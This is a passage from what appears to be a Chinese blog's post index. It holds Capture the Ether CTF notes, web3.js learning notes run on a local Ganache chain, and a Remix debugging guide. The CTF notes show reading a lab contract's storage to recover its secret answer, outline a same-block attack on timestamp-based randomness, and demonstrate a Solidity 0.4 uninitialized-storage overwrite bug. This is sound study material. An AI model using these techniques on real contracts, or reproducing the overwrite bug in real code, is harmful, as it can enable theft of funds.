区块链链上的所有内容都是公开的，我们可以利用与合约交互，获取到合约上存储的值 2.3 又因为合约中只有一个变量，及索引为 0 位置的值，便是我的答案answer 1var contract = new web.eth.Contract(contract_abi,contract_add); tips: 为了弄懂这个存储位置，我还特意去阅读相关文献了解了EVM的存储位置和原理，相关文章在这 ： storage-slot存储拓展 3. 解题 3.1 用 js代码 实现 web3 与合约的交互 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// console.log(web.currentProvider);// remix 上部署的合约地址var contract_add = &quot;0x4DB61fCf9a56da7575e38f68BAf8E1621513001a&quot;;// 在remix 上获取的 ABIvar contract_abi = [ &#123; &quot;constant&quot;: false, &quot;inputs&quot;: [ &#123; &quot;name&quot;: &quot;n&quot;, &quot;type&quot;: &quot;uint8&quot; &#125; ], &quot;name&quot;: &quot;guess&quot;, &quot;outputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;constant&quot;: true, &quot;inputs&quot;: [], &quot;name&quot;: &quot;isComplete&quot;, &quot;outputs&quot;: [ &#123; &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bool&quot; &#125; ], &quot;payable&quot;: false, &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// 创建合约实例var contract = new web.eth.Contract(contract_abi,contract_add);// console.log(contract);web.eth.getStorageAt(contract_add,0,(error,result) =&gt; &#123; // 将结果的 16 进制数转化为 10进制 var answer = web.utils.hexToNumber(result); //输出结果 console.log(&quot;存储为：&quot;,answer)&#125;) 3.2 在控制台获取 合约 的 answer 3.3 在 remix 中验证 3.4 结果正确","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"capther the ether总结","slug":"Smart contracts/capther the ether/capther the ether总结","date":"2023-04-03T02:39:10.000Z","updated":"2023-04-03T02:39:10.000Z","comments":true,"path":"2023/04/03/Smart contracts/capther the ether/capther the ether总结/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/03/Smart%20contracts/capther%20the%20ether/capther%20the%20ether%E6%80%BB%E7%BB%93/","excerpt":"","text":"capther the ether总结1. Guess the secret number 1.1 学会了如何使用暴力破解 2. Guess the random number 2.1 了解了些 EVM的存储的原理，智能合约上全局变量的存贮位置，适当学会了如何取出来 2.2 采用web3 和智能合约交互，获取存储的所需值 12345var answer;web.eth.getStorageAt(contractADD,0,(err,result)=&gt;&#123; answer = web.utils.hexToNumber(result); console.log(answer);&#125;) 3. Guess the new number 3.1 知道了合约部署的时候，全局变量会被赋值或者初始化，但是函数体里的则不会被赋值或者初始化，只有当函数被调用的时候才会 3.2 知道了当一个合约调用另一个合约的时候会在同一块区块执行，也就是说 合约之间的调用是在同一个区块当中的 又因为 同一区块中的时间戳是相同的 所以可以推出 可以在攻击合约调用 所需的方法然后原合约中函数的局部变量 answer 根据攻击合约的时间戳生成相对应的 answer 这样一来我们就可以直接将获取到 answer 4. Predict the future5.Predict the block hash6. Token sale7. Token whale8. Mapping 8.1 知道了一个合约能够存储的数据大小为 9.Donation 9.1 探究了一下 memory 和 storage 对 结构体的存储位置的影响 验证猜想的合约： 1234567891011121314151617181920212223242526272829303132contract StorageTest1 &#123; uint256 a; // slot 0 address owner; // slots 1 struct Entry &#123; uint256 id; uint256 value; &#125; Entry c; // slots 2-3&#125;contract StorageTest2 &#123; struct Entry &#123; uint256 id; uint256 value; &#125; uint256 a=10; // slot 0 address owner=&quot;0x5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;; // slots 1 // 我想知道是不是执行f函数之后slot0 位置的a 和 slot1位置的owner 被 entry.id 和 entry.value的值给覆盖 function f() public payable &#123; Entry entry; entry.id = 20; entry.value = 666; &#125;&#125; 9.2 使用web3进行交互，获取 StorageTest2 合约部署好之后 slot0 和 slot1 存储的值是什么 web3测试猜想 的代码如下： 1234567891011121314151617let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:8545&quot;));var fs = require(&quot;fs&quot;);var ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\StorageTest2.abi&quot;),toString());var address = &quot;0x52fE4CEafD8e3c717008aC100224e7b4e94BfB8F&quot;;var contract = new web.eth.Contract(ABI,address);web.eth.getStorageAt(address,0,(err,slot0)=&gt;&#123; console.log(&quot;The getStorageAt slot0 is =&gt; &quot; + slot0);&#125;)web.eth.getStorageAt(address,1,(err,slot1)=&gt;&#123; console.log(&quot;The getStorageAt slot1 is =&gt; &quot; + slot1);&#125;) 结果是： 9.3 当我在remix上执行f函数后，再查看 slot0 和 slot1的值 可以明显发现原来插槽 0 和 1 位置的值已经被覆盖了 9.4 测试一下结构体和全局声明位置不同会不会影响存储位置 结构体声明在全局变量之后 合约代码： 1234567891011121314151617181920pragma solidity ^0.4.21;contract StorageTest &#123; uint256 a = 9; uint256[2] b = [1,2]; struct Entry &#123; uint256 id; address value; &#125; Entry c; function f() public &#123; Entry c; c.id = 3; c.value = 0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f; &#125;&#125; web3交互的代码： 1234567891011121314151617181920212223242526272829let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:8545&quot;));var fs = require(&quot;fs&quot;);var ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\StorageTest2.abi&quot;),toString());var address = &quot;0xEA34F5801A19Db18b9DFE4f5D62F669d673ec605&quot;;var contract = new web.eth.Contract(ABI,address);web.eth.getStorageAt(address,0,(err,slot0)=&gt;&#123; console.log(&quot;The getStorageAt slot0 is =&gt; &quot; + slot0);&#125;)web.eth.getStorageAt(address,1,(err,slot1)=&gt;&#123; console.log(&quot;The getStorageAt slot1 is =&gt; &quot; + slot1);&#125;)web.eth.getStorageAt(address,2,(err,slot2)=&gt;&#123; console.log(&quot;The getStorageAt slot2 is =&gt; &quot; + slot2);&#125;)web.eth.getStorageAt(address,3,(err,slot3)=&gt;&#123; console.log(&quot;The getStorageAt slot3 is =&gt; &quot; + slot3);&#125;)web.eth.getStorageAt(address,4,(err,slot4)=&gt;&#123; console.log(&quot;The getStorageAt slot4 is =&gt; &quot; + slot4);&#125;) 这是测试结果: 结构体声明在全局变量之前： 合约代码： 1234567891011121314151617181920pragma solidity ^0.4.21;contract StorageTest &#123; struct Entry &#123; uint256 id; address value; &#125; Entry c; uint256 a = 9; uint256[2] b = [1,2]; function f() public &#123; Entry c; c.id = 3; c.value = 0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f; &#125; &#125; 测试结果： 结论：在合约定义的全局变量会根据你在合约中声明的先后顺序来分配存储位置（即slot0、slot1）这些，但是在函数体中，如果有结构体类型的申明，且存储类型为默认或为 storage 都会对对原来的存储位置的值进行覆盖 10.Fifty years11.Fuzzy identity12.Public key13.Account Takeover14.Assume ownership15.Token bank","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"},{"name":"capther总结","slug":"capther总结","permalink":"https://biyouqiuqiu.com/tags/capther%E6%80%BB%E7%BB%93/"}]},{"title":"web3_self","slug":"Web3/Basic_Knowledge/web3_self","date":"2023-04-01T02:47:10.000Z","updated":"2023-04-01T02:47:10.000Z","comments":true,"path":"2023/04/01/Web3/Basic_Knowledge/web3_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/01/Web3/Basic_Knowledge/web3_self/","excerpt":"","text":"web3_day01学习资源视频官方文档好文档1. Web3.js 的安装1.1 node.js 的下载安装及配置： 参考博客1.2 在 VSCode 中安装插件 ： code runner 2. 下载安装使用Ganache网上搜一下就有了，建议自己创建一个工作的空间，这样之前操作 的交易信息就会被保留下来。 3. 跟着视频敲代码3.1 视频中的代码：123let Web3 = require(&#x27;web3&#x27;);web3 = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web3); 分析： 解读：第一行中的 require(&#39;web3&#39;) web3是库中的名字，我以为是自定义的，尝试改成其他名字报错如下： 变量名 web3 容易和第一行中的 ‘web3’ 搞混，所以自己换了一个变量名 自己的代码： 123let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web); 4. 子模块列表 在执行这段代码的时候，出现了错误 代码： 1234let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));web.eth.getNodeInfo().then(console.log); 解读： 官方文档上的原函数是这样这样写的: web3.eth.getNodeInfo([callback]); 老师的写法是： web.eth.getNodeInfo().then(); 老师说是一样的，.then 的意思是：执行完web.eth.getNodeInfo() 之后，再去执行 .then() 括号里的代码，即 console.log 。 错误： 解决方案： 打开菜单选项，找到之前安装的 Ganache，启动它即可，然后再次运行代码 总结：如果把 Ganache 关闭了，代码又是不能运行的，只有将 Gannache 一直开着的，才可以正常运行，但是 不知那一大串是什么 5. 网络状态查询5.1 查看是否连接到节点 ： web.eth.net.isListening().then(console.log); web.bzz.net.isListening().then(console.log); 5.2 获取 Network ID (网络号) 6. providers相关6.1 查看 Web3 中所有可用的Providers 代码： 123456789&gt;let Web3 = require(&#x27;web3&#x27;);&gt;web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));&gt;// web.eth.getNodeInfo().then(console.log);&gt;// web.eth.net.isListening().then(console.log);&gt;// web.bzz.net.isListening().then(console.log);&gt;console.log(web.providers); 运行结果： 6.2 查看当前设置的 Web3 provider 6.3 查看浏览器环境设置的web3 provider 6.4 设置&#x2F; 修改 provider 7. 批处理请求7.1 将发布合约到测试网 重头戏！！！看到这个界面，我就知道，我又可以学到东西了 原来是是这样连接本地的账户，直接惊呆！ 方法一： ① 打开remix，选择这两个其中之一： ② 将自己本地的端口号填入： ③ 然后就呈现如下界面： ④ 本地账户和remix 中的 账户一一对应： 方法二：嵌入式连接 ① 添加网络 ② 和 remix 建立连接 此时当前网络钱包没钱 ③ 通过私钥导入本地账户 ④ 导入成功之后，就可以在remix 中同步账户余额 ⑤ 可以测试一下，是否能正常使用，结果是 ok 滴 ⑥ 在本地可以查看 remix部署的合约 7.2 复制ABI 和 地址到程序中 ① 复制 remix 中的 ABI ② 到代码程序中，定义一个变量 var abi,并将复制的ABI 作为值，赋给 abi ③ 到remix 中拷贝地址，并赋予 我们自定义的变量 var address 1var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;; ④ 通过 ABI 和 合约地址 去 创建合约对象 1var contract = new web.eth.Contract(abi,address); ⑤ 然后就是是一系列的调用操作（目前代码还不是很懂） 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getNodeInfo().then(console.log);// web.eth.net.isListening().then(console.log);// web.bzz.net.isListening().then(console.log);// console.log(web.providers);// console.log(web);// console.log(Web3.modules);// console.log(Web3.version);// var web = new Web3(Web3.givenProvider || &quot;ws://localhost:8545&quot;);// console.log(web);var abi = [ &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;_number&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;name&quot;: &quot;setNumber&quot;, &quot;outputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;name&quot;: &quot;getNumber&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// 部署出来的合约地址var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;;var contract = new web.eth.Contract(abi,address);function callBack1() &#123; console.log(&quot;callBack1() is running&quot;);&#125;function callBack2() &#123; console.log(&quot;callBack2() is running&quot;);&#125;var batch = new web.BatchRequest();// &quot;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&quot; 是函数调用者的地址batch.add(web.eth.getBalance.request(&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;,&#x27;latest&#x27;,callBack1));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,callBack2));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,function(error,reusult)&#123; console.log(error); console.log(reusult);&#125;));batch.execute(); 结果： 8. 大数据处理（bigNumber）》》》工具的文档在此处8.1 简介 测试案例： 9. 以太单位转换9.1 web3.utils.fromWei 注意：web3.utils.fromWei(number,[unit])中的 number 通常都是用字符串表示，如果直接是数字的话就会报错 示例： 9.2 web3.utils.toWei 9.3 web3.utils.toHex 演示： tips: 还可以将字符串转换为 16进制 9.4 web3.utils.hexToNumberString 演示示例： 9.5 还有一些其他的转化 10. 地址相关的操作10.1 web3.isAddress ***解读：为什么第五条代码执行的结果为 false？ *** 可以参考我同学的博客：[26.checksum of address | solidity life (levi104.com)](https://www.levi104.com/2023/04/02/03.solidity进阶/26.checksum of address&#x2F;) 11. 查询区块信息11.1 查询最新的区块号(区块高度)–web3.eth.getBlockNumber() 11.2 查询最新区块– we3.eth.getBlock() 11.3 查询区块中的交易 – web3.eth.getTransactionFromBlock() web3_day0212. web3.js 交易操作12.1 账户相关12.1.1 查询账户个数 – web3.eth.getAccount() 12.1.2 查询账户个数 – web3.eth.getAccounts() 12.1.3 查询coinbase – web3.eth.getCoinbase() 12.2 交易相关12.2.1 查询余额 – web3.eth.getBalance() 12.2.2 查询平均 gas 价格 123web3.eth.getGasPrice().then((result) =&gt; &#123; console.log(&quot;wei: &quot; + result);&#125;) 可能是我没学过前端吧，这个写法属实让我震惊。。。。。 12.3 交易执行相关12.3.1 发送交易 – web3.eth.sendTransaction() 突发奇想，试试能不能给我另一个账户转钱 代码： 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), data: &#x27;&#x27;&#125;web.eth.sendTransacation(transactionObject).then(console.log); from (本地账户)： to (钱包地址)： 但是报错了，如下： 再回去看视频，打开弹幕，直接狠狠感谢弹幕老哥！！！！ 正确代码：将 data 字段删掉，或者注释掉 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), // data: &#x27;&#x27;&#125;web.eth.sendTransaction(transactionObject).then(console.log); 代码正常运行： 到我的钱包去查看余额，发现转账成功： 12.3.2 查询交易信息 — web3.eth.getTransaction() 12.3.3 查询交易收据（进区块数据） – web3.eth.getTransactionReceipt() 13. web3.js 合约交互 — 最想学的地方13.1 应用程序二进制接口(ABI)13.1.1 ABI 简介 13.1.2 ABI 范例 13.1.3 ABI表现形式举例 13.1.4 ABI 的作用 13.2 创建合约13.2.1 准备智能合约 MyContract.sol: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MyContract &#123; //状态变量 string storageVaule; //public 的状态变量 string public name; // 构造函数 constructor() public &#123; storageVaule = &quot;biyou&quot;; &#125; // 结构体 struct Student &#123; string name; int age; &#125; // 修改状态变量 function setStorageValue(string memory str) public &#123; storageVaule = str; &#125; function getStorageValue() public view returns(string memory) &#123; return storageVaule; &#125; // 可以发币的函数 function setMoney() public payable &#123; &#125; // 事件 event myEvent (string name); function emitEvent(string memory name) public returns(string memory) &#123; emit myEvent(name); return strConcat(&quot;hello&quot;,name); &#125; function strConcat(string memory _a, string memory _b) internal pure returns(string memory) &#123; bytes memory _ba = bytes(_a); bytes memory _bb = bytes(_b); string memory ret = new string(_ba.length + _bb.length); bytes memory bret = bytes(ret); uint k = 0; for (uint i = 0; i &lt; _ba.length; i++) bret[k++] = _ba[i]; for (uint i = 0; i &lt; _bb.length; i++) bret[k++] = _bb[i]; return string(ret); &#125;&#125; 13.2.2 直接使用js在区块链上部署一个新的智能合约（！！！难点） 测试代码： 1234567891011121314151617181920212223let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs 模块读取.sol合约文件var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var data = &quot;0x608060405234801561001057600080fd5b506040518060400160405280600581526020017f6269796f750000000000000000000000000000000000000000000000000000008152506000908051906020019061005c929190610062565b50610166565b82805461006e90610105565b90600052602060002090601f01602090048101928261009057600085556100d7565b82601f106100a957805160ff19168380011785556100d7565b828001600101855582156100d7579182015b828111156100d65782518255916020019190600101906100bb565b5b5090506100e491906100e8565b5090565b5b808211156101015760008160009055506001016100e9565b5090565b6000600282049050600182168061011d57607f821691505b6020821081141561013157610130610137565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b61095f806101756000396000f3fe60806040526004361061004a5760003560e01c806306fdde031461004f57806344e649b71461007a57806390ad7f5414610084578063982296a8146100af578063ec6070f6146100ec575b600080fd5b34801561005b57600080fd5b50610064610115565b60405161007191906106a9565b60405180910390f35b6100826101a3565b005b34801561009057600080fd5b506100996101a5565b6040516100a691906106a9565b60405180910390f35b3480156100bb57600080fd5b506100d660048036038101906100d1919061062f565b610237565b6040516100e391906106a9565b60405180910390f35b3480156100f857600080fd5b50610113600480360381019061010e919061062f565b6102b6565b005b60018054610122906107df565b80601f016020809104026020016040519081016040528092919081815260200182805461014e906107df565b801561019b5780601f106101705761010080835404028352916020019161019b565b820191906000526020600020905b81548152906001019060200180831161017e57829003601f168201915b505050505081565b565b6060600080546101b4906107df565b80601f01602080910402602001604051908101604052809291908181526020018280546101e0906107df565b801561022d5780601f106102025761010080835404028352916020019161022d565b820191906000526020600020905b81548152906001019060200180831161021057829003601f168201915b5050505050905090565b60607f52b54003f649c6d5ca97ae2b169c38f3c257eb14026ad745b11808153cdfd1528260405161026891906106a9565b60405180910390a16102af6040518060400160405280600581526020017f68656c6c6f000000000000000000000000000000000000000000000000000000815250836102d0565b9050919050565b80600090805190602001906102cc929190610524565b5050565b6060600083905060008390506000815183516102ec919061073d565b67ffffffffffffffff81111561032b577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f19166020018201604052801561035d5781602001600182028036833780820191505090505b50905060008190506000805b855181101561043d578581815181106103ab577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b8383806103c290610842565b9450815181106103fb577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061043590610842565b915050610369565b5060005b845181101561051557848181518110610483577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b83838061049a90610842565b9450815181106104d3577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061050d90610842565b915050610441565b50829550505050505092915050565b828054610530906107df565b90600052602060002090601f0160209004810192826105525760008555610599565b82601f1061056b57805160ff1916838001178555610599565b82800160010185558215610599579182015b8281111561059857825182559160200191906001019061057d565b5b5090506105a691906105aa565b5090565b5b808211156105c35760008160009055506001016105ab565b5090565b60006105da6105d5846106f0565b6106cb565b9050828152602081018484840111156105f257600080fd5b6105fd84828561079d565b509392505050565b600082601f83011261061657600080fd5b81356106268482602086016105c7565b91505092915050565b60006020828403121561064157600080fd5b600082013567ffffffffffffffff81111561065b57600080fd5b61066784828501610605565b91505092915050565b600061067b82610721565b610685818561072c565b93506106958185602086016107ac565b61069e81610918565b840191505092915050565b600060208201905081810360008301526106c38184610670565b905092915050565b60006106d56106e6565b90506106e18282610811565b919050565b6000604051905090565b600067ffffffffffffffff82111561070b5761070a6108e9565b5b61071482610918565b9050602081019050919050565b600081519050919050565b600082825260208201905092915050565b600061074882610793565b915061075383610793565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156107885761078761088b565b5b828201905092915050565b6000819050919050565b82818337600083830152505050565b60005b838110156107ca5780820151818401526020810190506107af565b838111156107d9576000848401525b50505050565b600060028204905060018216806107f757607f821691505b6020821081141561080b5761080a6108ba565b5b50919050565b61081a82610918565b810181811067ffffffffffffffff82111715610839576108386108e9565b5b80604052505050565b600061084d82610793565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156108805761087f61088b565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000601f19601f830116905091905056fea2646970667358221220f839dcd300d8752d974808215c924e8e08a1d6556227d4be2b3c89805e41a38764736f6c63430008020033&quot;;myContract.deploy(&#123; data: data&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 1500000, gasPrice: &#x27;1000000&#x27;&#125;,function(error,result)&#123; console.log(result)&#125;)// var contractAddress = &quot;&quot;;// var myContract = new web.eth.Contract(myContractABI,contractAddress); 报错： 原因：\\ 是一个特殊字符，即转义字符，需要 \\\\ 这样表示一个 \\ 执行结果： 这个结果是不正确的，没有给我们返回一个地址，解决办法是： 将 gasPrice 字段注释掉， 如 // gasPrice: &#39;1000000&#39; 再次执行其结果为： ① data 来源（需要在前面加一个0x）： 可以在 Ganache 上面查到 在vscode 部署的合约地址： 用这个合约地址到，remix 上验证一下： 13.3 调用合约函数13.3.1 调用智能合约读函数 代码： 1234567891011121314let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs 模块读取.sol合约文件var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result);&#125;); 结果： 13.3.2 调用智能合约写函数 代码： 12345678910111213141516171819let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs 模块读取.sol合约文件var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.setStorageValue(&quot;new message&quot;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;&#125;).on(&quot;receipt&quot;, function(result)&#123; console.log(result); myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result); &#125;);&#125;); 13.4 调用合约事件13.4.1 合约事件监听 13.4.2 执行事件查询 14. 简单的DApp – 投票系统","categories":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/categories/Web3/"},{"name":"Basic_Knowledge","slug":"Web3/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Web3/Basic-Knowledge/"}],"tags":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"}]},{"title":"Remix-debug的使用","slug":"Solidity/Basic_Knowledge/Remix-debug的使用","date":"2023-03-31T06:47:10.000Z","updated":"2023-03-31T06:47:10.000Z","comments":true,"path":"2023/03/31/Solidity/Basic_Knowledge/Remix-debug的使用/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/31/Solidity/Basic_Knowledge/Remix-debug%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Remix-debug的使用参考博客官方文档1官方文档21. 参考博客中获取的测试代码：1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Debugging &#123; uint256 counter; constructor(uint256 _counter) &#123; counter = _counter; &#125; function _setCounter(uint256 _counter) internal &#123; counter = _counter; &#125; function increment(uint256 value) public &#123; uint256 newValue = counter + value; _setCounter(newValue); &#125; function decrement(uint256 value) public &#123; uint256 newValue = counter - value; _setCounter(newValue); &#125; function getCounter() public view returns(uint256) &#123; return counter; &#125;&#125; 2. 编译部署 3. 调用 increment 函数 4. 调试智能合约 4.1 先找到交易的hash值：0xe19af7a3be310b85ccfb9538ef16314a575f395aae3787f71f897b4845547885 4.2 将交易的哈希填入，debug 的参数框内，点击 Start debugging 4.3 了解各个按钮的意思 ① 返回到上一个步骤。函数调用将被忽略，调试器将不进入该函数。 ② 后退一步回到上一步。函数不会被忽略，调试器将进入该函数。 ③ Step into进入下一步，如果有函数调用，调试器将进入函数。 ④ 跨步前进进入下一步，但是函数调用将被忽略，调试器不会进入函数。 ⑤ 跳到上一个断点，使调试器进入最后访问的断点。可以通过点击代码的行号来设置断点 ⑥ 跳出将调试器带到函数的末端 ⑦ 跳到下一个断点会使调试器跳到编辑器中的下一个设定的断点。 还有一个是滑块，类似于进度条 4.4 刚开始调试的时候，increment() 函数体中的某些变量是高亮的，比如newValue 这个变量正在被创建。一直往下调试的时候，counter 和 value 的也会高亮显示，模拟了加法的工作情况 4.5 最终，在后几步， Solidity Locals 面板上这样显示 这意味着 newValue 当前的值是520。再继续往后走, _setCounter 函数将会高亮，意味着 控制被传递到内部函数 _setCounter ，此时 debug 将不能继续往下走了，表示该方法已经运行完成 4.6 可以观察到 Solidity State 中的 counter 的值已经发生了更新 5. 其他调试功能5.1 函数栈 这个面板可以得到很多信息，比如哪个函数目前正在执行，哪个函数调用了它。如果有多个函数，它将以堆栈的形式显示。 5.2 全局变量 可以跟踪交易中的全局变量，以备你需要知道交易中的发件人或其他数据 5.3 步骤细节 可以得到一些额外的步骤数据，如已使用的gas 和 剩余的 gas 5.4 操作码 使用操作码，可以得到关于合同当前步骤的高级信息。你可以了解程序何时执行步骤，如 JUMP （？？？？）。 内心：此时的我内心还是很懵逼的，道理都懂，但是其中的细节还是不懂，为什么下一步可以点那么那么多下，之前学 Java 的时候，使用 Idea debug调试代码，好像都不需要点这么多下，可能得多用吧，多练多用","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"Remix-debug","slug":"Remix-debug","permalink":"https://biyouqiuqiu.com/tags/Remix-debug/"}]},{"title":"ERC20的理解","slug":"Smart 